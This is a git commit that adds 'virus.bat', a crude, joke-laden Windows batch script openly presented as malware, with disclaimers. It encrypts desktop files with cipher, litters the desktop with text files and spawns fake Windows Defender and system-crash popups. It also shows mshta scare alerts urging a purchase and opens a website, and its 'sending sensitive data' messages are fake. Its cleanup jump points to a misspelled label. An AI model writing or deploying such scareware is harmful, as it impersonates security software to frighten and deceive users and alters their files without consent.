f177697ae6de5ef12aa82735127154a53ad91aca
keyholderRLM <edeadaedad@gmail.com>
2025-05-14 13:00:47 +0200

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,220 @@
+@echo off
+:: **************************************************
+:: **************************************************
+:: 
+:: This software is for educational and testing purposes only.
+:: By running this script, you agree that you are fully aware of the actions it simulates.
+:: 
+:: I am not responsible for any damage, data loss, or system instability caused by running this script.
+:: Use this script in a controlled, isolated, and virtual environment. 
+:: Always back up your data before experimenting with any system-altering scripts.
+:: 
+:: **************************************************
+
+cls
+echo.
+echo ========================================
+echo       WARNING: MALICIOUS SCRIPT
+echo ========================================
+echo.
+echo **************************************************
+echo DISCLAIMER:
+echo **************************************************
+echo This software is for educational, testing, and research purposes only.
+echo By running this script, you acknowledge that you are fully aware of the actions it simulates,
+echo including but not limited to encryption, file manipulation, and the generation of pop-up alerts.
+echo.
+echo This script is not intended for use in a production environment or on any personal, corporate, or 
+echo critical systems. It is strongly advised to run this script in a controlled, isolated, and virtual 
+echo environment, such as a virtual machine (VM) or a sandbox.
+echo.
+echo I am not responsible for any direct or indirect consequences that may arise from running this script,
+echo including, but not limited to, data loss, system instability, file corruption, or any other form of damage.
+echo Running this script may interfere with system performance, cause crashes, or result in data being inaccessible.
+echo.
+echo If you proceed, you agree that you will not hold me or any associated parties liable for any damages or
+echo consequences that may occur. Always ensure that you back up important data before running any system-altering scripts.
+echo.
+echo **************************************************
+echo.
+echo Use this script at your own risk. The user accepts full responsibility for the use and outcomes of this script.
+echo **************************************************
+echo.
+
+pause
+
+
+echo DISCLAIMER: This script is being executed for educational purposes only.
+pause
+cls
+
+echo ts script has rat, scareware, virus,encrypter, copier and uhh gurtlings.
+echo press any key to die if not just close ts already
+pause 
+for /l %%i in (1,1,10) do (
+ echo ts pmo joe jack gurt:yo me:sybau %%i > "%USERPROFILE%\skrivebord\gurts day today_%%i.txt"
+)
+
+echo happy gurts day (new date real real it is uhh this day: %date%  > "%USERPROFILE%\Skrivebord\happy gurts day.txt"
+echo gurt:yo
+echo omg free robax pls pls yes yes !!!!!!!
+echo but am evil guy ahhah!11111111111
+echo me khili
+echo debug: sending random popups
+echo debug: but first lets encrypt real
+ 
+cipher /e "%USERPROFILE%\Skrivebord\Important.txt"
+cipher /e "%USERPROFILE%\skrivebord\important.txt"
+cipher /e "%USERPROFILE%\skrivebord\important.txt"
+
+
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
+echo me now encrypt yuor files hahahaw muwhawhaha and uhh yes spam poopups!!!!!! 
+echo evil gurt
+echo MsgBox "gurt:⚠️ Threat detected: Trojan.GenericKD.421923", vbCritical, "Windows Defender" > %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "Error: Windows Defender failed to remove the threat.", vbExclamation, "Security Error" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "System error in C:\Windows\System32\ntoskrnl.exe", vbCritical, "SYSTEM32 ERROR" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "to prevent gurtlings to spawn, your pece must sybau immediately.", vbYesNo + vbQuestion, "Critical Alert" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "System will restart in 60 seconds...", vbInformation, "System Restart" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurt is mad: 0x0000007B (INACCESSIBLE_BOOT_DEVICE)", vbCritical, "💀 SYSTEM CRASH" >> %temp%\popup.vbs
+
+echo MsgBox "gurt: ok me spam this now" > %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "subricece " >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo MsgBox "gurt: ok me spam this now" > %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "subricece " >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+echo WScript.Sleep 15 >> %temp%\popup.vbs
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+cscript //nologo %temp%\popup.vbs
+echo let the gurtligoons spread!
+
+
+echo (debug) now the script makes fake scareware and shit
+
+
+
+
+echo @echo off > new_script.bat
+cls
+color 0C
+echo WARNING: Your antivirus has detected malicious activity!
+ping localhost -n 2 >nul
+echo Critical error: Virus detected. Initiating scan...
+ping localhost -n 3 >nul
+
+
+
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+
+
+echo gurts casts necromancy rise!
+
+echo (more debug) and more scareware
+
+
+
+echo @echo off > new_script1.bat
+color 0C
+cls
+echo Changing system time...
+time 66:66:66
+ping localhost -n 2 >nul
+
+echo @echo off > new_script2.bat
+cls
+echo Sending sensitive data to remote server...
+ping localhost -n 2 >nul
+echo Data sent: 2MB of gurt data
+ping localhost -n 2 >nul
+
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
+
+echo @echo off > new_script3.bat
+title ok
+
+
+echo Displaying critical system alert...
+mshta "javascript:alert('Warning! Your system is infected with 5 viruses. Please act immediately to prevent damage!');window.close();"
+
+
+echo Displaying urgent warning...
+mshta "javascript:alert('Important: Your system is at risk! Scan now to avoid permanent data loss.');window.close();"
+
+
+echo Displaying warning about system damage...
+mshta "javascript:alert('Critical Error: Immediate action required! Data loss is imminent.');window.close();"
+
+
+echo Displaying fake solution...
+mshta "javascript:alert('To fix this problem, purchase FULL!! BIG RATT!!!! now! Click OK to continue to website.');window.close();"
+
+
+start https://bigrat.monster/
+
+
+
+
+
+
+echo pause >> new_script.bat
+echo pause >> new_script1.bat
+echo pause >> new_script2.bat
+echo pause >> new_script3.bat
+
+echo i cast necromancy
+echo RISE!!
+call new_script.bat
+call new_script1.bat
+call new_script2.bat
+call new_script3.bat
+
+pause
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+goto cleaning
+
+
+
+
+:cleaing
+echo we done right=?!?!?!
+echo btw this horse is cleaning for you
+start https://tenor.com/view/horse-sweeping-broom-radlcies-gif-24147266
+del new_script.bat
+del %temp%\popup.vbs
+
+
+pause
